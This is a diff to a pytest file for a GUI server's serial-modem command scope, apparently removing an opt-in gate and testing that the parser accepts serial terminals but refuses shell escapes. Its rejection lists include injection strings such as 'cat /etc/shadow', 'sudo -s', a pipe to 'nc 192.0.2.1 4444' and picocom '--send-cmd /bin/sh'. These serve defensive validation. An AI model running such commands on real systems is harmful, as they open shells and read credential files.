@@ -16,7 +16,7 @@ Exercises:
   ``/dev/ttyUSB*`` / ``/dev/ttyACM*`` / ``/dev/serial/by-id/*`` shapes
   and rejects anything that smells like shell injection.
 
-The PTY spawn helper itself is not exercised here — it forks a real
+The PTY spawn helper itself is not exercised here -- it forks a real
 child and is covered by the route tests when those run.
 """
 
@@ -29,7 +29,6 @@ import pytest
 def _clear_host_shell_env(monkeypatch, tmp_path):
     """Default-off posture mirrors a fresh shell."""
     monkeypatch.delenv("YGGDRASIM_GUI_HOST_SHELL", raising=False)
-    monkeypatch.delenv("YGGDRASIM_GUI_HIL_MODEM", raising=False)
     monkeypatch.setenv("YGGDRASIM_RUNTIME_ROOT", str(tmp_path))
     yield
 
@@ -130,7 +129,6 @@ def test_describe_hil_modem_capability_does_not_require_full_host_shell(monkeypa
     from yggdrasim_common.gui_server import host_shell
 
     monkeypatch.delenv("YGGDRASIM_GUI_HOST_SHELL", raising=False)
-    monkeypatch.setenv("YGGDRASIM_GUI_HIL_MODEM", "1")
     snapshot = host_shell.describe_hil_modem_capability()
     assert snapshot["scope"] == "hil-modem"
     if snapshot["supported"]:
@@ -140,14 +138,74 @@ def test_describe_hil_modem_capability_does_not_require_full_host_shell(monkeypa
         assert snapshot["default_command_source"] == "local"
 
 
-def test_describe_hil_modem_capability_is_default_off() -> None:
+def test_describe_hil_modem_capability_needs_no_opt_in() -> None:
+    """The command policy is what makes this scope safe, not a gate.
+
+    It launches no login shell and takes only a known serial terminal
+    against an explicit device path, so an opt-in in front of it bought
+    nothing an operator could act on and, being read once at startup,
+    could not be turned on from the window that needed it.
+    """
     from yggdrasim_common.gui_server import host_shell
 
     snapshot = host_shell.describe_hil_modem_capability()
     if snapshot["supported"]:
-        assert snapshot["enabled"] is False
-        assert snapshot["default_command"] == ""
-        assert "YGGDRASIM_GUI_HIL_MODEM=1" in snapshot["reason"]
+        assert snapshot["enabled"] is True
+        assert snapshot["reason"] is None
+        assert snapshot["command_policy"] == "serial-terminal-only"
+
+
+def test_the_modem_scope_still_refuses_anything_but_a_serial_terminal() -> None:
+    """Removing the gate must not widen what the scope will run."""
+    from yggdrasim_common.gui_server import host_shell
+
+    for rejected in ("bash", "sh -c 'id'", "cat /etc/shadow", "tio"):
+        with pytest.raises(ValueError):
+            host_shell.parse_hil_modem_command(rejected)
+
+    assert host_shell.parse_hil_modem_command("tio /dev/ttyUSB2")[0].endswith("tio")
+
+
+def test_sudo_is_allowed_in_front_of_a_serial_terminal() -> None:
+    """A serial device is often root-owned and the udev rule is not always
+    the operator's to write, so the wrapper is permitted."""
+    from yggdrasim_common.gui_server import host_shell
+
+    for accepted in (
+        "sudo tio /dev/ttyUSB2",
+        "sudo -n minicom -D /dev/ttyUSB2",
+        "doas tio /dev/ttyACM0",
+        "ssh -tt pi@rig.example.test sudo tio /dev/ttyUSB2",
+    ):
+        argv = host_shell.parse_hil_modem_command(accepted)
+        # The wrapper survives into what is executed; validation reads
+        # past it rather than stripping it from the command that runs.
+        assert argv == accepted.split()
+
+
+def test_sudo_may_not_become_a_shell() -> None:
+    """The point of the scope is that it hands out no shell.
+
+    Every sudo option but the harmless one is refused rather than
+    reasoned about, so the word after the wrapper is always the command
+    that runs.
+    """
+    from yggdrasim_common.gui_server import host_shell
+
+    for rejected in (
+        "sudo",
+        "sudo -s",
+        "sudo -i",
+        "sudo --login",
+        "sudo bash",
+        "sudo sh -c 'id'",
+        "sudo -u root bash",
+        "sudo cat /etc/shadow",
+        "sudo tio",
+        "ssh -tt pi@rig.example.test sudo -s",
+    ):
+        with pytest.raises(ValueError):
+            host_shell.parse_hil_modem_command(rejected)
 
 
 def test_describe_hil_modem_capability_prefers_remote_card_bridge_target(
@@ -156,7 +214,6 @@ def test_describe_hil_modem_capability_prefers_remote_card_bridge_target(
     from yggdrasim_common.gui_server import host_shell
     from yggdrasim_common.gui_server.actions import card_bridge
 
-    monkeypatch.setenv("YGGDRASIM_GUI_HIL_MODEM", "1")
     card_bridge._write_remote_rig_state({
         "ssh_target": "pi@example.test",
         "identity_file": "~/.ssh/id_rpi",
@@ -172,11 +229,17 @@ def test_describe_hil_modem_capability_prefers_remote_card_bridge_target(
         assert "sudo" not in snapshot["default_command"]
 
 
-def test_parse_hil_modem_command_rejects_sudo_tio() -> None:
+def test_the_default_command_does_not_reach_for_sudo() -> None:
+    """Allowed when an operator asks for it, never offered by default.
+
+    The default assumes the device is reachable, because granting the
+    device is the better answer where the rule is yours to write.
+    """
     from yggdrasim_common.gui_server import host_shell
 
-    with pytest.raises(ValueError, match="does not run sudo"):
-        host_shell.parse_hil_modem_command("sudo tio /dev/ttyUSB2")
+    snapshot = host_shell.describe_hil_modem_capability()
+    if snapshot["supported"]:
+        assert "sudo" not in snapshot["default_command"]
 
 
 def test_parse_hil_modem_command_accepts_unprivileged_tio() -> None:
@@ -295,3 +358,63 @@ def test_parse_host_command_rejects_invalid(command):
 
     with pytest.raises(ValueError):
         host_shell.parse_host_command(command)
+
+
+HIL_MODEM_ACCEPTED_COMMANDS = (
+    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2",
+    "ssh -tt -o BatchMode=yes -o ConnectTimeout=8 esim@rig.example.test tio /dev/ttyUSB2",
+    "tio /dev/ttyUSB2",
+    "sudo -n tio /dev/ttyUSB2",
+    "tio -b 115200 /dev/ttyUSB2",
+    "picocom -b 115200 /dev/ttyACM0",
+    "tio /dev/serial/by-id/usb-Quectel_EG25-G_0123-if02-port0",
+)
+
+HIL_MODEM_REFUSED_COMMANDS = (
+    # ssh joins everything after the target into one string for the rig's
+    # login shell, so these are a shell on the rig, not a serial terminal.
+    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 ; bash",
+    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 && id",
+    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 | nc 192.0.2.1 4444",
+    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 $(id)",
+    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 > /etc/passwd",
+    # Options that make an allowed terminal run something or write a file.
+    "screen -c /tmp/rc /dev/ttyUSB2",
+    "minicom -S /tmp/script -D /dev/ttyUSB2",
+    "minicom -C /tmp/capture -D /dev/ttyUSB2",
+    "picocom --send-cmd /bin/sh /dev/ttyUSB2",
+    "picocom --receive-cmd /bin/sh /dev/ttyUSB2",
+)
+
+
+def _validate_hil_modem_command(raw: str) -> None:
+    import shlex
+
+    from yggdrasim_common.gui_server import host_shell as hs
+
+    argv = shlex.split(raw)
+    if argv and argv[0] == "ssh":
+        hs._validate_hil_modem_ssh_command(argv)
+    else:
+        hs._validate_hil_modem_terminal_command(argv)
+
+
+@pytest.mark.parametrize("command", HIL_MODEM_ACCEPTED_COMMANDS)
+def test_the_modem_shell_still_accepts_a_real_serial_terminal(command: str) -> None:
+    """The scope has to stay usable: these are what operators actually type."""
+    _validate_hil_modem_command(command)
+
+
+@pytest.mark.parametrize("command", HIL_MODEM_REFUSED_COMMANDS)
+def test_the_modem_shell_refuses_a_command_that_is_not_a_serial_terminal(
+    command: str,
+) -> None:
+    """The hil-modem scope bypasses the host-shell env gate on purpose.
+
+    It is reachable by anything holding the GUI bearer token, so it must
+    hand out a serial port and nothing else. Checking only argv[0] and
+    that some argument looks like a device left every other argument free,
+    and over SSH those become shell syntax on the rig.
+    """
+    with pytest.raises(ValueError):
+        _validate_hil_modem_command(command)
